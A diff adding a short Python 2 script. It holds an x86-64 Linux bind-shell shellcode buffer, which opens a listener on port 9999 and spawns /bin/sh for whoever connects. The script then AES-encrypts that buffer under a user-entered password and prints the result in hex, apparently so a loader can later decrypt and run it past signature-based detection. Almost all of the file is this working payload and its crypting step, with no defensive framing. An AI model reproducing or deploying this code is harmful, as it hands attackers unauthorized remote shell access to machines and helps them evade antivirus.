@@ -1,0 +1,27 @@
+from AESCipher import *
+import getpass
+
+buf =  ""
+buf += "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
+buf += "\x97\x52\xc7\x04\x24\x02\x00\x27\x0f\x48\x89\xe6\x6a"
+buf += "\x10\x5a\x6a\x31\x58\x0f\x05\x6a\x32\x58\x0f\x05\x48"
+buf += "\x31\xf6\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\x48"
+buf += "\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99"
+buf += "\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89"
+buf += "\xe7\x52\x57\x48\x89\xe6\x0f\x05\x90"
+
+print "Original payload: %s" % print_in_hex(buf)
+
+key1 = '1'
+key2 = '2'
+while True:
+    key1 = getpass.getpass("Please enter password: ")
+    key2 = getpass.getpass("Please re-enter password: ")
+    if key1 == key2:
+        break
+    else:
+        print "passwords not matching. please try again..."
+key = key1
+aes = AESCipher(key)
+encrypted = aes.encrypt(buf)
+print print_in_hex(encrypted)
